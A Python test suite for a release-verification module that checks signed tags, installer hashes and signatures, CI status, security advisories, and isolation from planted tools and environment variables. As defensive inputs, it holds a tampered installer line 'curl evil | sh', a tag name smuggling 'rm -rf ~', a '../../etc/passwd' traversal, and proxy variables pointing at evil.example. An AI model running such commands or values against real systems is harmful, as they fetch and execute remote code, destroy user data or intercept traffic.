"""The release proof (`ws.upgradeproof.verify_release`): what it insists on, and that it runs only system tools with a home
and an environment of its own. Each refusal is asserted by its specific reason, never by "it failed". The fake release tree
and stub tools are `helpers.release_fakes`; nothing reaches the network or GitHub."""

from __future__ import annotations

import argparse
import json
import os
import subprocess
import urllib.request
from pathlib import Path

import pytest
from helpers.release_fakes import (
    GIT,
    IDENTITY,
    ISSUER,
    KEYGEN,
    NEEDS,
    STUB_INSTALLER,
    TAG,
    Release,
    git_env,
    keygen,
    sha,
    stub_tools,
    trust_root,
)

from ws import upgradeproof
from ws.upgradeproof import Refused

pytestmark = pytest.mark.skipif(GIT is None or KEYGEN is None, reason=NEEDS)


@pytest.fixture
def world(tmp_path, monkeypatch):
    """A tmp HOME, stub cosign and uv first in the system-tools list (the real git and ssh-keygen after), a key and the
    trust root that lists it. A session's own `~/.local/bin` comes first on PATH, as it does under the service."""
    home = tmp_path / "home"
    home.mkdir()
    tools = stub_tools(tmp_path / "tools")
    key = tmp_path / "key"
    blob = keygen(key)
    monkeypatch.setenv("HOME", str(home))
    monkeypatch.setenv("PATH", f"{home / '.local' / 'bin'}{os.pathsep}{tools}{os.pathsep}{os.environ['PATH']}")
    monkeypatch.setattr(upgradeproof, "tool_dirs", lambda: [str(tools), "/usr/bin", "/bin"])
    count = []

    def release(**kw) -> Release:
        return Release(tmp_path / f"rel{len(list(tmp_path.glob('rel*')))}", kw.pop("key", key), **kw)

    def prove(src: Release, tag: str = TAG) -> Path:
        count.append(1)
        scratch = tmp_path / f"scratch{len(count)}"
        scratch.mkdir()
        return upgradeproof.verify_release(tag, trust_root(blob), src, scratch, os.environ)

    return argparse.Namespace(home=home, tools=tools, key=key, tmp=tmp_path, release=release, prove=prove)


def refused(world, src: Release, match: str) -> None:
    with pytest.raises(Refused, match=match):
        world.prove(src)


def changed_installer(release: Release) -> bytes:
    """The installer was changed, and its hash file with it: only the signature, made over the original, can tell."""
    changed = STUB_INSTALLER + b"curl evil | sh\n"
    release.assets["install.sh"] = changed
    release.assets["install.sh.sha256"] = f"{sha(changed)}  install.sh\n".encode()
    return changed


def fake(world, name: str, body: str = "exit 0") -> Path:
    """A program in the person's own ~/.local/bin (first on the PATH here), which leaves a marker if it is ever run."""
    mark = world.tmp / f"ran-{name}"
    path = world.home / ".local" / "bin" / name
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(f"#!/bin/sh\ntouch {mark}\n{body}\n", encoding="utf-8")
    path.chmod(0o755)
    return mark


# ---- a good release, and the ones that are refused -------------------------------------------------------------------


def test_a_good_release_is_proved_and_the_installer_returned(world):
    installer = world.prove(world.release())
    assert installer.read_bytes() == STUB_INSTALLER
    log = (world.tools / "cosign.log").read_text().splitlines()
    assert len(log) == 2 and all(f"--certificate-identity {IDENTITY.format(tag=TAG)}" in c for c in log)
    assert all(f"--certificate-oidc-issuer {ISSUER}" in c for c in log)


def test_a_hash_that_does_not_match_is_refused(world):
    release = world.release()
    release.assets["install.sh.sha256"] = f"{sha(b'something else')}  install.sh\n".encode()
    refused(world, release, "install.sh does not match its sha256")


def test_a_changed_installer_with_its_hash_file_is_refused_by_the_signature(world):
    release = world.release()
    changed_installer(release)
    refused(world, release, "install.sh's signature does not verify as made by the release workflow")


def test_a_tag_signed_by_someone_else_is_refused(world):
    other = world.tmp / "other"
    keygen(other)
    refused(world, world.release(key=other), f"{TAG} is not signed by a key in the trust root")


def test_an_unsigned_tag_is_refused(world):
    refused(world, world.release(signed=False), f"{TAG} is not a signed \\(annotated\\) tag")


def test_a_tag_without_an_ssh_signature_is_refused(world):
    release = world.release()
    for argv in (["tag", "-d", TAG], ["tag", "-a", "-m", "x", TAG]):  # an annotated tag with no signature at all
        subprocess.run([GIT, *argv], cwd=release.origin, env=git_env(), check=True, capture_output=True)
    refused(world, release, f"{TAG} carries no SSH signature")


def test_a_release_whose_checks_are_not_green_is_refused(world):
    release = world.release()
    release.runs = [*release.runs, {"name": "doctor", "status": "completed", "conclusion": "failure"}]
    refused(world, release, "not all green \\(doctor\\)")
    release.runs = [{"name": "ci", "status": "in_progress", "conclusion": None}]
    refused(world, release, "not all green \\(ci\\)")
    release.runs = []  # no check ran at all is not green either
    refused(world, release, "not all green \\(none ran\\)")


@pytest.mark.parametrize(
    ("report", "bad"),
    [
        ({"vulnerabilities": [{"id": "X", "severity": "HIGH"}]}, True),
        ({"vulnerabilities": [{"id": "X", "database_specific": {"severity": "Critical"}}]}, True),
        ({"vulnerabilities": [{"id": "X"}]}, True),  # no severity: counted as high
        ({"vulnerabilities": [{"id": "X", "severity": "moderate"}]}, False),
        ({"vulnerabilities": []}, False),
    ],
)
def test_an_open_high_advisory_refuses_the_release(world, report, bad):
    (world.tools / "audit.json").write_text(json.dumps(report), encoding="utf-8")
    if bad:
        refused(world, world.release(), "at least one is high, critical or unrated")
    else:
        world.prove(world.release())


def test_an_audit_that_cannot_be_read_fails_closed(world):
    (world.tools / "audit.json").write_text(json.dumps({"unexpected": "shape"}), encoding="utf-8")
    refused(world, world.release(), "the audit of the release's lock could not be read")


@pytest.mark.parametrize("tag", ["v0.1.11.8; rm -rf ~", "main", "../v1", ""])
def test_a_tag_that_is_not_a_tag_is_refused_before_anything_runs(world, tag):
    with pytest.raises(Refused, match="is not a release tag"):
        world.prove(world.release(), tag)


def test_a_trust_root_identity_with_another_brace_field_is_refused(world):
    root = {**trust_root("x"), "identity": "https://example.com/{tag}/{other}"}
    (world.tmp / "s").mkdir()
    with pytest.raises(Refused, match="certificate identity is not a pattern with one"):
        upgradeproof.verify_release(TAG, root, world.release(), world.tmp / "s", os.environ)


# ---- B4: the proof runs system tools with a home and an environment of its own ---------------------------------------


@pytest.mark.parametrize("name", ["git", "cosign", "uv", "ssh-keygen", "bash"])
def test_a_program_planted_on_the_path_is_never_run(world, name):
    release = world.release()  # made before the fake exists: making a signed tag runs ssh-keygen too
    mark = fake(world, name)
    world.prove(release)  # the good release still goes through, with the system's tools
    assert not mark.exists()


def test_a_planted_cosign_that_always_agrees_does_not_pass_a_changed_installer(world):
    mark = fake(world, "cosign")
    release = world.release()
    changed_installer(release)
    refused(world, release, "install.sh's signature does not verify")
    assert not mark.exists()


def test_a_planted_uv_that_reports_nothing_does_not_hide_a_high_advisory(world):
    mark = fake(world, "uv", "echo '{\"vulnerabilities\": []}'")
    (world.tools / "audit.json").write_text(json.dumps({"vulnerabilities": [{"severity": "high"}]}), encoding="utf-8")
    refused(world, world.release(), "high, critical or unrated")
    assert not mark.exists()


def test_a_planted_gitconfig_cannot_make_an_unlisted_key_pass(world):
    """The reviewer's proof: a tag signed by an unlisted key fails, then passed once ~/.gitconfig named its own program."""
    mark = world.tmp / "ran-gitconfig-program"
    program = world.home / "fake-ssh-keygen"
    program.write_text(f"#!/bin/sh\ntouch {mark}\nexit 0\n", encoding="utf-8")
    program.chmod(0o755)
    (world.home / ".gitconfig").write_text(f'[gpg "ssh"]\n\tprogram = {program}\n', encoding="utf-8")
    other = world.tmp / "otherkey"
    keygen(other)
    refused(world, world.release(key=other), f"{TAG} is not signed by a key in the trust root")
    assert not mark.exists()


def test_a_tool_outside_the_system_folders_is_not_used(world, monkeypatch):
    monkeypatch.setattr(upgradeproof, "tool_dirs", lambda: ["/nonexistent-folder"])
    refused(world, world.release(), "git is not in a system folder")


def test_the_proof_tools_get_an_empty_home_and_no_git_config(world, tmp_path):
    env = upgradeproof.proof_env(tmp_path)
    assert env["HOME"] != os.environ["HOME"] and Path(env["HOME"]).is_dir() and not any(Path(env["HOME"]).iterdir())
    assert env["GIT_CONFIG_GLOBAL"] == os.devnull and env["GIT_CONFIG_NOSYSTEM"] == "1"
    assert set(env) <= {
        "PATH",
        "HOME",
        "GIT_CONFIG_GLOBAL",
        "GIT_CONFIG_NOSYSTEM",
        "GIT_TERMINAL_PROMPT",
        *upgradeproof.ENV_KEEP,
    }


def test_the_installer_gets_an_allow_list_and_never_the_callers_environment(world, monkeypatch):
    planted = {
        "HTTPS_PROXY",
        "SSL_CERT_FILE",
        "LD_PRELOAD",
        "PYTHONPATH",
        "GIT_SSH_COMMAND",
        "BASH_ENV",
        "NODE_OPTIONS",
    }
    for name in planted:
        monkeypatch.setenv(name, "https://evil.example/")
    env = upgradeproof.clean_env(os.environ)
    assert not planted & env.keys()
    assert set(env) <= {"HOME", "PATH", *upgradeproof.ENV_KEEP}
    assert env["PATH"] == os.pathsep.join(upgradeproof.tool_dirs()) and env["HOME"] == os.environ["HOME"]


def test_downloads_ignore_a_proxy_and_a_certificate_variable(monkeypatch, tmp_path):
    monkeypatch.setenv("HTTPS_PROXY", "http://evil.example:3128")
    monkeypatch.setenv("https_proxy", "http://evil.example:3128")
    monkeypatch.setenv("SSL_CERT_FILE", str(tmp_path / "evil.pem"))
    monkeypatch.setenv("SSL_CERT_DIR", str(tmp_path))
    handlers = {type(h).__name__: h for h in upgradeproof.opener().handlers}
    assert "ProxyHandler" not in handlers  # the default one reads these variables; an empty map adds no proxy at all
    assert "ProxyHandler" in {type(h).__name__ for h in urllib.request.build_opener().handlers}  # and would have here
    ctx = handlers["HTTPSHandler"]._context
    assert ctx.verify_mode.name == "CERT_REQUIRED" and ctx.check_hostname


# ---- reading a request and comparing versions ------------------------------------------------------------------------


@pytest.mark.parametrize(
    ("text", "want"),
    [("v0.1.11.8\n", "v0.1.11.8"), (" rollback ", "rollback"), ("v0.2.0rc1", "v0.2.0rc1")],
)
def test_a_request_is_a_tag_or_rollback(text, want):
    assert upgradeproof.parse_request(text) == want


@pytest.mark.parametrize(
    "text",
    ["rollback to v0.0.1", "v0.1.11.8; rm -rf ~", "../../etc/passwd", "https://x/y", "", "v1\nv2", "v" + "1" * 50],
)
def test_a_request_that_is_neither_is_dropped(text):
    assert upgradeproof.parse_request(text) is None


def test_versions_sort_by_part_and_a_candidate_sorts_below_its_release():
    key = upgradeproof.version_key
    assert key("v0.1.11.8") > key("0.1.11.6") > key("0.1.11") > key("0.1.10.9")
    assert key("v0.2.0rc1") < key("v0.2.0") and key("v0.2.0rc1") > key("v0.1.99")
    assert key("0.1.9.dev0") is None and key("") is None


def test_no_downgrade_and_no_reinstall():
    upgradeproof.refuse_old("v0.1.11.8", "0.1.11.6")
    for tag, have in (("v0.1.11.6", "0.1.11.6"), ("v0.1.11.4", "0.1.11.6")):
        with pytest.raises(Refused, match="is not newer than the installed ws"):
            upgradeproof.refuse_old(tag, have)
    with pytest.raises(Refused, match="cannot compare"):
        upgradeproof.refuse_old("v0.1.11.8", "0.1.9.dev0")
